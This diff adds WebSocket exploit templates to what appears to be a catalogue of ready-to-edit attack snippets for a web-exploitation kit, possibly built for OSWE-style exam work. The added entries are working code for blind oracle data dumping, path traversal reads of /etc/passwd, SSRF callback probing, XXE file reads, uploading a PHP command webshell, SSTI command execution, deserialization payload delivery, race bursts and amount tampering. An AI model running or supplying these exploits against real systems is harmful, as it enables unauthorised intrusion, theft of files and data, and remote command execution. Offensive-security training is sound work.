+        try:
+            ws_request(WS_PATH_OR_URL, msg, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN, timeout=TIMEOUT + SLEEP_SECONDS + 2)
+        except Exception as e:
+            if "timed out" in str(e).lower() or "timeout" in e.__class__.__name__.lower():
+                return True
+            raise
+        return (time.time() - start) > THRESHOLD
+
+    out = ""
+    for pos in range(1, MAX_LEN + 1):
+        if not oracle(LEN_CONDITION.format(query=QUERY, pos=pos)):
+            break
+        for ch in CHARSET:
+            cond = CHAR_CONDITION.format(query=QUERY, pos=pos, ord_ch=ord(ch))
+            if oracle(cond):
+                out += ch
+                print("[dump]", out)
+                break
+        else:
+            die(f"no charset match at pos {pos}")
+    check(out, "websocket time oracle dumped nothing")
+    return out
+`
+  },
+  {
+    id:"websocket-prefix-oracle-dump",
+    title:"REPLACE dump() - WebSocket prefix oracle extractor",
+    category:"NoSQL / LDAP / XPath",
+    kind:"replace",
+    chainRole:"extract",
+    defaultFunction:"dump_ws_prefix_oracle",
+    aliases:["websocket","ws prefix","nosql regex","ldap prefix","xpath prefix","starts with","regex dump","blind dump"],
+    useWhen:"A WebSocket search/login/filter message returns true when a guessed prefix matches. Works for NoSQL regex, LDAP prefix, XPath starts-with style bugs.",
+    editFirst:["WS_PATH_OR_URL","MESSAGE_TEMPLATE","INJECT_FIELD","PAYLOAD_TEMPLATE","TRUE_TEST","CHARSET","MAX_LEN"],
+    dependsOn:["helper-websocket-transport"],
+    sourceRefs:["v4"],
+    code:String.raw`def dump_ws_prefix_oracle():
+    WS_PATH_OR_URL = "/ws/search"              # EDIT or full ws:// / wss:// URL
+    ORIGIN = None                              # EDIT
+    HEADERS = {}                               # EDIT
+    COOKIES = {}                               # EDIT
+    SESSION_COOKIES = True                     # EDIT
+    MESSAGE_TEMPLATE = {"username": "__PAYLOAD__", "password": "x"}  # EDIT
+    INJECT_FIELD = "username"                  # EDIT supports dotted path
+    PAYLOAD_TEMPLATE = "admin{prefix}*"         # EDIT NoSQL/LDAP/XPath shape; keep {prefix}
+    TRUE_TEST = "marker"                       # EDIT: marker | json_status_true | json_status_taken
+    TRUE_MARKER = "taken"                      # EDIT
+    CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_-.@{}"  # EDIT
+    MAX_LEN = 80                               # EDIT
+
+    def is_true(raw):
+        if TRUE_TEST == "marker":
+            return TRUE_MARKER in raw
+        data = json.loads(raw)
+        if TRUE_TEST == "json_status_true":
+            return bool(data.get("status"))
+        if TRUE_TEST == "json_status_taken":
+            return data.get("status") == "taken"
+        die("bad TRUE_TEST")
+
+    out = ""
+    for _ in range(MAX_LEN):
+        for ch in CHARSET:
+            guess = out + ch
+            payload = PAYLOAD_TEMPLATE.format(prefix=guess)
+            msg = ws_message_set(MESSAGE_TEMPLATE, INJECT_FIELD, payload)
+            raw = ws_request(WS_PATH_OR_URL, msg, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN)
+            if is_true(raw):
+                out = guess
+                print("[dump]", out)
+                break
+        else:
+            break
+    check(out, "websocket prefix oracle dumped nothing")
     return out
 `
   },
@@ -1952,6 +3337,50 @@ if (input.operation === "decrypt") {
 `
   },
   {
+    id:"websocket-file-read",
+    title:"REPLACE dump() - WebSocket file read / traversal",
+    category:"File Read",
+    kind:"replace",
+    chainRole:"extract",
+    defaultFunction:"dump_ws_file_read",
+    aliases:["websocket file read","ws traversal","path traversal","download","read file","lfi websocket"],
+    useWhen:"A WebSocket message contains a filename/path field and the response returns file content or a file-read error marker.",
+    editFirst:["WS_PATH_OR_URL","MESSAGE_TEMPLATE","PATH_FIELD","FILE_PATH","VALUE_MODE","VALUE_REGEX"],
+    dependsOn:["helper-websocket-transport","helper-save-output"],
+    sourceRefs:["v4"],
+    code:String.raw`def dump_ws_file_read():
+    WS_PATH_OR_URL = "/ws/file"              # EDIT
+    ORIGIN = None                            # EDIT
+    HEADERS = {}                             # EDIT
+    COOKIES = {}                             # EDIT
+    SESSION_COOKIES = True                   # EDIT
+    MESSAGE_TEMPLATE = {"path": "__PATH__"}  # EDIT exact Burp WS message
+    PATH_FIELD = "path"                      # EDIT supports dotted path
+    FILE_PATH = "../../../../etc/passwd"     # EDIT
+    VALUE_MODE = "raw"                       # EDIT: raw | regex | json
+    VALUE_REGEX = r"((?:root|daemon):x:[^\n]+)"  # EDIT
+    JSON_PATH = ("content",)                 # EDIT for VALUE_MODE=json
+    OUT_FILE = "loot/ws_file_read.txt"       # EDIT
+
+    msg = ws_message_set(MESSAGE_TEMPLATE, PATH_FIELD, FILE_PATH)
+    raw = ws_request(WS_PATH_OR_URL, msg, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN)
+    if VALUE_MODE == "raw":
+        content = raw
+    elif VALUE_MODE == "regex":
+        m = re.search(VALUE_REGEX, raw, re.S)
+        check(m, "file content regex not found")
+        content = m.group(1)
+    elif VALUE_MODE == "json":
+        content = json_get(json.loads(raw), JSON_PATH)
+        check(content is not None, "json file content not found")
+    else:
+        die("bad VALUE_MODE")
+    append_line(OUT_FILE, str(content))
+    print(str(content)[:1000])
+    return content
+`
+  },
+  {
     id:"file-read-traversal",
     title:"REPLACE dump() - Path traversal file read",
     category:"File Read",
@@ -1986,6 +3415,76 @@ if (input.operation === "decrypt") {
     check(r.status_code == 200, f"file read failed: {r.status_code}")
     print(r.text[:2000])
     return r.text
+`
+  },
+  {
+    id:"websocket-ssrf-oob-probe",
+    title:"REPLACE exploit() - WebSocket SSRF/OOB probe",
+    category:"SSRF / OOB",
+    kind:"replace",
+    chainRole:"exploit",
+    defaultFunction:"websocket_ssrf_oob_probe",
+    aliases:["websocket ssrf","ws ssrf","oob","callback","url field","internal fetch","socket ssrf"],
+    useWhen:"The server-side fetch URL is supplied inside a WebSocket message instead of an HTTP form/API request.",
+    editFirst:["WS_PATH_OR_URL","MESSAGE_TEMPLATE","URL_FIELD","CALLBACK_PATH","EXPECT"],
+    dependsOn:["helper-websocket-transport"],
+    sourceRefs:["v4"],
+    code:String.raw`def websocket_ssrf_oob_probe():
+    WS_PATH_OR_URL = "/ws/import"            # EDIT
+    ORIGIN = None                            # EDIT
+    HEADERS = {}                             # EDIT
+    COOKIES = {}                             # EDIT
+    SESSION_COOKIES = True                   # EDIT
+    MESSAGE_TEMPLATE = {"url": "__URL__"}    # EDIT exact Burp WS message
+    URL_FIELD = "url"                        # EDIT supports dotted path
+    CALLBACK_PATH = "ws-ssrf"                # EDIT
+    EXPECT = ""                              # EDIT optional response marker
+
+    require_callback()
+    target_url = callback_url(CALLBACK_PATH)
+    msg = ws_message_set(MESSAGE_TEMPLATE, URL_FIELD, target_url)
+    raw = ws_request(WS_PATH_OR_URL, msg, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN)
+    print("[ws ssrf]", raw)
+    if EXPECT:
+        check(EXPECT in raw, "expected SSRF WS marker missing")
+    print("[i] check listener for:", target_url)
+    return raw
+`
+  },
+  {
+    id:"websocket-xxe-inline-file-read",
+    title:"REPLACE exploit() - WebSocket XXE inline file read",
+    category:"SSRF / OOB",
+    kind:"replace",
+    chainRole:"exploit",
+    defaultFunction:"websocket_xxe_inline_file_read",
+    aliases:["websocket xxe","ws xxe","xml websocket","doctype","file entity","inline xxe"],
+    useWhen:"The XML body or XML field is sent through WebSocket and you need an inline XXE file-read payload.",
+    editFirst:["WS_PATH_OR_URL","MESSAGE_TEMPLATE","XML_FIELD","FILE_PATH","BODY_TEMPLATE"],
+    dependsOn:["helper-websocket-transport","helper-xxe-response-extractor"],
+    sourceRefs:["v4"],
+    code:String.raw`def websocket_xxe_inline_file_read():
+    WS_PATH_OR_URL = "/ws/xml"               # EDIT
+    ORIGIN = None                            # EDIT
+    HEADERS = {}                             # EDIT
+    COOKIES = {}                             # EDIT
+    SESSION_COOKIES = True                   # EDIT
+    MESSAGE_TEMPLATE = {"xml": "__XML__"}    # EDIT set to "__XML__" if raw text frame
+    XML_FIELD = "xml"                        # EDIT supports dotted path; set "" for raw XML frame
+    FILE_PATH = "/etc/passwd"                # EDIT
+    ENTITY_NAME = "xxe"                      # EDIT
+    BODY_TEMPLATE = """<root><name>__ENTITY__</name></root>"""  # EDIT paste Burp XML body
+
+    doctype = f'<!DOCTYPE data [<!ENTITY {ENTITY_NAME} SYSTEM "file://{FILE_PATH}">]>'
+    entity_ref = f"&{ENTITY_NAME};"
+    xml = "<?xml version=\"1.0\"?>\n" + doctype + "\n" + BODY_TEMPLATE.replace("__ENTITY__", entity_ref)
+    if XML_FIELD:
+        msg = ws_message_set(MESSAGE_TEMPLATE, XML_FIELD, xml)
+        raw = ws_request(WS_PATH_OR_URL, msg, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN)
+    else:
+        raw = ws_request(WS_PATH_OR_URL, xml, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN, send_json=False)
+    print("[ws xxe]", raw[:1000])
+    return extract_xxe_content(raw) or raw
 `
   },
   {
@@ -2556,6 +4055,52 @@ if (input.operation === "decrypt") {
 `
   },
   {
+    id:"websocket-upload-webshell",
+    title:"REPLACE exploit() - WebSocket upload webshell",
+    category:"Upload / Webshell",
+    kind:"replace",
+    chainRole:"exploit",
+    defaultFunction:"upload_webshell_ws",
+    aliases:["websocket upload","ws upload","base64 file","webshell","upload shell","socket file upload"],
+    useWhen:"Upload is done through a WebSocket message, commonly with filename/content/base64 fields.",
+    editFirst:["WS_PATH_OR_URL","MESSAGE_TEMPLATE","FILENAME_FIELD","CONTENT_FIELD","ENCODING","SHELL_URL"],
+    dependsOn:["helper-websocket-transport"],
+    sourceRefs:["v4"],
+    code:String.raw`def upload_webshell_ws():
+    WS_PATH_OR_URL = "/ws/upload"            # EDIT
+    ORIGIN = None                            # EDIT
+    HEADERS = {}                             # EDIT
+    COOKIES = {}                             # EDIT
+    SESSION_COOKIES = True                   # EDIT
+    MESSAGE_TEMPLATE = {"filename": "__NAME__", "content": "__CONTENT__"}  # EDIT
+    FILENAME_FIELD = "filename"              # EDIT supports dotted path
+    CONTENT_FIELD = "content"                # EDIT supports dotted path
+    FILENAME = "shell.php"                   # EDIT
+    SHELL = "<?php system($_GET['cmd'] ?? 'id'); ?>"  # EDIT
+    ENCODING = "plain"                       # EDIT: plain | b64 | hex
+    SHELL_URL = "/uploads/shell.php"         # EDIT
+    SUCCESS_MARKER = ""                      # EDIT optional
+
+    content = SHELL
+    if ENCODING == "b64":
+        content = base64.b64encode(SHELL.encode()).decode()
+    elif ENCODING == "hex":
+        content = SHELL.encode().hex()
+    elif ENCODING != "plain":
+        die("bad ENCODING")
+
+    msg = ws_message_set(MESSAGE_TEMPLATE, FILENAME_FIELD, FILENAME)
+    msg = ws_message_set(msg, CONTENT_FIELD, content)
+    raw = ws_request(WS_PATH_OR_URL, msg, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN)
+    print("[ws upload]", raw)
+    if SUCCESS_MARKER:
+        check(SUCCESS_MARKER in raw, "websocket upload marker missing")
+    r = send_request("GET", SHELL_URL, params={"cmd": "whoami"}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
+    print("[shell]", r.text[:500])
+    return SHELL_URL
+`
+  },
+  {
     id:"upload-webshell",
     title:"REPLACE exploit() - Upload webshell",
     category:"Upload / Webshell",
@@ -2615,6 +4160,49 @@ if (input.operation === "decrypt") {
         out = m.group(1) if m else out
     print(out.strip())
     return out
+`
+  },
+  {
+    id:"websocket-generic-run-cmd",
+    title:"REPLACE run_cmd() - Generic WebSocket command/SSTI",
+    category:"Command / SSTI",
+    kind:"replace",
+    chainRole:"cmd",
+    defaultFunction:"run_cmd",
+    aliases:["websocket cmd","ws command","ws ssti","websocket ssti","eval websocket","command injection websocket"],
+    useWhen:"The command/SSTI/eval payload is delivered as a field in a WebSocket message and the response contains command output or marker.",
+    editFirst:["WS_PATH_OR_URL","MESSAGE_TEMPLATE","CMD_FIELD","PAYLOAD_TEMPLATE","OUTPUT_MODE","OUTPUT_REGEX"],
+    dependsOn:["helper-websocket-transport"],
+    sourceRefs:["v4"],
+    code:String.raw`def run_cmd(cmd):
+    WS_PATH_OR_URL = "/ws/exec"              # EDIT
+    ORIGIN = None                            # EDIT
+    HEADERS = {}                             # EDIT
+    COOKIES = {}                             # EDIT
+    SESSION_COOKIES = True                   # EDIT
+    MESSAGE_TEMPLATE = {"cmd": "__CMD__"}    # EDIT exact Burp WS message
+    CMD_FIELD = "cmd"                        # EDIT supports dotted path
+    PAYLOAD_TEMPLATE = "{cmd}"               # EDIT e.g. "{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}"
+    OUTPUT_MODE = "raw"                      # EDIT: raw | regex | json
+    OUTPUT_REGEX = r"OSWE:(.*?):EWSO"        # EDIT
+    JSON_PATH = ("output",)                  # EDIT
+
+    payload = PAYLOAD_TEMPLATE.format(cmd=cmd.replace("\\", "\\\\").replace("'", "\\'"))
+    msg = ws_message_set(MESSAGE_TEMPLATE, CMD_FIELD, payload)
+    raw = ws_request(WS_PATH_OR_URL, msg, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN)
+    if OUTPUT_MODE == "raw":
+        out = raw
+    elif OUTPUT_MODE == "regex":
+        m = re.search(OUTPUT_REGEX, raw, re.S)
+        check(m, "command output regex not found")
+        out = m.group(1)
+    elif OUTPUT_MODE == "json":
+        out = json_get(json.loads(raw), JSON_PATH)
+        check(out is not None, "json command output missing")
+    else:
+        die("bad OUTPUT_MODE")
+    print(out)
+    return str(out)
 `
   },
   {
@@ -2896,6 +4484,61 @@ def trigger_reverse_shell():
     check(r.status_code == 200, "ssti request failed")
     print(r.text.strip())
     return r.text
+`
+  },
+  {
+    id:"websocket-deser-delivery",
+    title:"REPLACE exploit() - WebSocket deserialization delivery",
+    category:"Deserialization",
+    kind:"replace",
+    chainRole:"exploit",
+    defaultFunction:"deliver_websocket_deser_payload",
+    aliases:["websocket deserialization","ws deser","serialized websocket","pickle websocket","base64 payload","ysoserial websocket"],
+    useWhen:"Serialized data is sent inside a WebSocket text/JSON field instead of normal HTTP.",
+    editFirst:["WS_PATH_OR_URL","MESSAGE_TEMPLATE","PAYLOAD_FIELD","PAYLOAD_MODE","PAYLOAD_FILE","ENCODING"],
+    dependsOn:["helper-websocket-transport"],
+    sourceRefs:["v4"],
+    code:String.raw`def deliver_websocket_deser_payload():
+    WS_PATH_OR_URL = "/ws/import"            # EDIT
+    ORIGIN = None                            # EDIT
+    HEADERS = {}                             # EDIT
+    COOKIES = {}                             # EDIT
+    SESSION_COOKIES = True                   # EDIT
+    MESSAGE_TEMPLATE = {"payload": "__PAYLOAD__"}  # EDIT exact Burp WS shape
+    PAYLOAD_FIELD = "payload"                # EDIT supports dotted path; set "" for raw frame
+    PAYLOAD_MODE = "file"                    # EDIT: file | literal
+    PAYLOAD_FILE = "payload.bin"             # EDIT
+    PAYLOAD_LITERAL = "REPLACE"              # EDIT
+    ENCODING = "b64"                         # EDIT: b64 | hex | latin1 | plain
+    SUCCESS_MARKER = ""                      # EDIT optional
+
+    if PAYLOAD_MODE == "file":
+        raw_bytes = open(PAYLOAD_FILE, "rb").read()
+    elif PAYLOAD_MODE == "literal":
+        raw_bytes = PAYLOAD_LITERAL.encode()
+    else:
+        die("bad PAYLOAD_MODE")
+
+    if ENCODING == "b64":
+        payload = base64.b64encode(raw_bytes).decode()
+    elif ENCODING == "hex":
+        payload = raw_bytes.hex()
+    elif ENCODING == "latin1":
+        payload = raw_bytes.decode("latin1")
+    elif ENCODING == "plain":
+        payload = raw_bytes.decode()
+    else:
+        die("bad ENCODING")
+
+    if PAYLOAD_FIELD:
+        msg = ws_message_set(MESSAGE_TEMPLATE, PAYLOAD_FIELD, payload)
+        reply = ws_request(WS_PATH_OR_URL, msg, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN)
+    else:
+        reply = ws_request(WS_PATH_OR_URL, payload, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN, send_json=False)
+    print("[ws deser]", reply[:500])
+    if SUCCESS_MARKER:
+        check(SUCCESS_MARKER in reply, "websocket deserialization marker missing")
+    return reply
 `
   },
   {
@@ -4607,6 +6250,118 @@ public class JdbcSqlRunner {
     if EXPECT:
         check(EXPECT in out, "command marker missing")
     return out
+`
+  },
+  {
+    id:"websocket-second-order-trigger",
+    title:"REPLACE exploit() - WebSocket second-order trigger",
+    category:"HTTP / Session",
+    kind:"replace",
+    chainRole:"exploit",
+    defaultFunction:"websocket_second_order_trigger",
+    aliases:["websocket second order","ws stored trigger","stored websocket","bot trigger","delayed sink"],
+    useWhen:"First WebSocket message stores payload/state and a second WS/HTTP action later triggers processing.",
+    editFirst:["STORE_WS_PATH","STORE_MESSAGE","TRIGGER_MODE","TRIGGER_WS_PATH","TRIGGER_MESSAGE","TRIGGER_HTTP_PATH"],
+    dependsOn:["helper-websocket-transport"],
+    sourceRefs:["v4"],
+    code:String.raw`def websocket_second_order_trigger():
+    STORE_WS_PATH = "/ws/store"              # EDIT
+    STORE_MESSAGE = {"value": "PAYLOAD"}     # EDIT
+    TRIGGER_MODE = "ws"                      # EDIT: ws | http
+    TRIGGER_WS_PATH = "/ws/trigger"          # EDIT
+    TRIGGER_MESSAGE = {"action": "render"}   # EDIT
+    TRIGGER_HTTP_PATH = "/trigger"           # EDIT
+    ORIGIN = None                            # EDIT
+    HEADERS = {}                             # EDIT
+    COOKIES = {}                             # EDIT
+    SESSION_COOKIES = True                   # EDIT
+    EXPECT = ""                              # EDIT optional
+
+    stored = ws_request(STORE_WS_PATH, STORE_MESSAGE, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN)
+    print("[ws store]", stored)
+    if TRIGGER_MODE == "ws":
+        out = ws_request(TRIGGER_WS_PATH, TRIGGER_MESSAGE, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN)
+    elif TRIGGER_MODE == "http":
+        out = send_request("GET", TRIGGER_HTTP_PATH, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES).text
+    else:
+        die("bad TRIGGER_MODE")
+    print("[trigger]", out[:500])
+    if EXPECT:
+        check(EXPECT in out, "second-order marker missing")
+    return out
+`
+  },
+  {
+    id:"websocket-race-burst",
+    title:"REPLACE exploit() - WebSocket race burst helper",
+    category:"Logic / Race",
+    kind:"replace",
+    chainRole:"exploit",
+    defaultFunction:"websocket_race_burst",
+    aliases:["websocket race","ws race","burst","concurrent websocket","double spend","race condition"],
+    useWhen:"Race/logic bug requires sending the same WebSocket state-changing message many times concurrently.",
+    editFirst:["WS_PATH_OR_URL","MESSAGE","WORKERS","COUNT","SUCCESS_MARKER"],
+    dependsOn:["helper-websocket-transport"],
+    sourceRefs:["v4"],
+    code:String.raw`def websocket_race_burst():
+    import concurrent.futures
+    WS_PATH_OR_URL = "/ws/redeem"            # EDIT
+    ORIGIN = None                            # EDIT
+    HEADERS = {}                             # EDIT
+    COOKIES = {}                             # EDIT
+    SESSION_COOKIES = True                   # EDIT
+    MESSAGE = {"action": "redeem", "id": 1}  # EDIT
+    WORKERS = 20                             # EDIT
+    COUNT = 100                              # EDIT
+    SUCCESS_MARKER = ""                      # EDIT optional
+
+    def one(_):
+        try:
+            return ws_request(WS_PATH_OR_URL, MESSAGE, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN)
+        except Exception as e:
+            return "ERR:" + str(e)
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as ex:
+        results = list(ex.map(one, range(COUNT)))
+    hits = [r for r in results if (SUCCESS_MARKER in r if SUCCESS_MARKER else not r.startswith("ERR:"))]
+    print("[+] ws race hits:", len(hits), "of", COUNT)
+    if hits:
+        print(hits[0][:500])
+    return hits
+`
+  },
+  {
+    id:"websocket-logic-tamper",
+    title:"REPLACE exploit() - WebSocket logic/amount tamper",
+    category:"Logic / Race",
+    kind:"replace",
+    chainRole:"exploit",
+    defaultFunction:"websocket_logic_tamper",
+    aliases:["websocket logic","ws amount","negative amount","price tamper","parameter tamper","business logic"],
+    useWhen:"Business logic flaw is triggered by changing numeric/role/state fields in a WebSocket message.",
+    editFirst:["WS_PATH_OR_URL","MESSAGE_TEMPLATE","FIELD_PATH","VALUES","SUCCESS_MARKER"],
+    dependsOn:["helper-websocket-transport"],
+    sourceRefs:["v4"],
+    code:String.raw`def websocket_logic_tamper():
+    WS_PATH_OR_URL = "/ws/order"             # EDIT
+    ORIGIN = None                            # EDIT
+    HEADERS = {}                             # EDIT
+    COOKIES = {}                             # EDIT
+    SESSION_COOKIES = True                   # EDIT
+    MESSAGE_TEMPLATE = {"amount": 1}         # EDIT
+    FIELD_PATH = "amount"                    # EDIT supports dotted path
+    VALUES = [-1, 0, 999999999, "admin"]     # EDIT
+    SUCCESS_MARKER = "ok"                    # EDIT
+
+    hits = []
+    for value in VALUES:
+        msg = ws_message_set(MESSAGE_TEMPLATE, FIELD_PATH, value)
+        raw = ws_request(WS_PATH_OR_URL, msg, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN)
+        print("[try]", value, raw[:200])
+        if SUCCESS_MARKER in raw:
+            hits.append((value, raw))
+    check(hits, "no websocket logic tamper value worked")
+    return hits
 `
   },
   {
